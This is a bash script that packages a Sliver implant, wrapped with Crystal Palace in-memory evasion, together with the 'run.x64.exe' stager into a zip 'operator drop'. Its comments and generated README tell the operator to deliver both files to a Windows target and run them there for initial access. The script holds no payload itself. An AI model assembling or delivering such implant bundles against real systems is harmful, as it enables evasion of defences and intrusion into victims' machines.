#!/usr/bin/env bash
#
# bundle-implant.sh — package a Crystal-wrapped Sliver implant PICO together
# with the Crystal Palace 'run.x64.exe' stager into a single operator drop.
#
# Use case A (primary): initial-access evasion. The operator delivers BOTH
# files to the target and executes:
#     run.x64.exe <implant>.bin
# This invokes the Crystal Palace loader, which unmasks the Sliver implant
# DLL in memory and runs it under the evasion stack.
#
# Required env:
#   CRYSTAL_PALACE_HOME  Crystal Palace dist/ dir (provides run.x64.exe)
#
# Usage:
#   ./bundle-implant.sh <implant.bin> [output.zip]

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
[[ -f "$SCRIPT_DIR/.crystalenv" ]] && source "$SCRIPT_DIR/.crystalenv"

: "${CRYSTAL_PALACE_HOME:?Set CRYSTAL_PALACE_HOME or create sliver-glue/.crystalenv with CRYSTAL_PALACE_HOME=<path>}"

IMPLANT_BIN="${1:?Usage: bundle-implant.sh <implant.bin> [output.zip]}"
OUTPUT="${2:-./build/crystal-implant-drop.zip}"

if [[ ! -f "$IMPLANT_BIN" ]]; then
    echo "error: PICO not found: $IMPLANT_BIN" >&2
    exit 2
fi

STAGER="$CRYSTAL_PALACE_HOME/demo/run.x64.exe"
if [[ ! -f "$STAGER" ]]; then
    echo "error: run.x64.exe not found at $STAGER" >&2
    echo "       It ships with the Crystal Palace distribution (demo/ folder)." >&2
    exit 2
fi

BUILD_DIR="$(dirname "$OUTPUT")"
mkdir -p "$BUILD_DIR"

STAGE="$(mktemp -d)"
trap 'rm -rf "$STAGE"' EXIT

cp "$STAGER"      "$STAGE/run.x64.exe"
cp "$IMPLANT_BIN" "$STAGE/$(basename "$IMPLANT_BIN")"

cat > "$STAGE/README.txt" <<EOF
Crystal-wrapped Sliver implant — operator drop bundle.

Files:
  run.x64.exe         Crystal Palace stager (BSD-3-Clause, (c) 2025 Raphael Mudge)
  $(basename "$IMPLANT_BIN")    PICO blob containing the Sliver implant + Crystal Palace evasion

Execute on target (Windows x64):
  run.x64.exe $(basename "$IMPLANT_BIN")
EOF

( cd "$STAGE" && zip -q -r "$OUTPUT" . )
OUTPUT_ABS="$(cd "$BUILD_DIR" && pwd)/$(basename "$OUTPUT")"

echo "[+] Operator drop bundle ready: $OUTPUT_ABS"
echo "    Contents:"
unzip -l "$OUTPUT_ABS"
